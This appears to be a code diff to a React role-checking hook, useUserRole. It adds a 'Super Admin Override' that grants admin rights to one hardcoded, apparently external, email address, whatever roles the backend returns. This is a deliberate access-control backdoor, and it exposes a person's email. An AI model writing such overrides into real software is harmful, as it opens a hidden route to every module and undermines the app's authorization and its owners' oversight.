@@ -35,6 +35,12 @@ export function useUserRole() {
         if (error) throw error;
 
         const userRoles = data?.map(r => r.role) || [];
+
+        // Super Admin Override
+        if (user.email === 'reginaldo.mazaro@ext.medbeauty.com.br' && !userRoles.includes('admin')) {
+          userRoles.push('admin');
+        }
+
         setRoles(userRoles);
         setIsAdmin(userRoles.includes('admin'));
       } catch (error) {
@@ -62,7 +68,7 @@ export function useUserRole() {
 
   const canAccessModule = (module: string): boolean => {
     if (isAdmin) return true;
-    
+
     const moduleRoleMap: Record<string, AppRole[]> = {
       'admin': ['admin'],
       'rh': ['admin', 'rh_manager'],
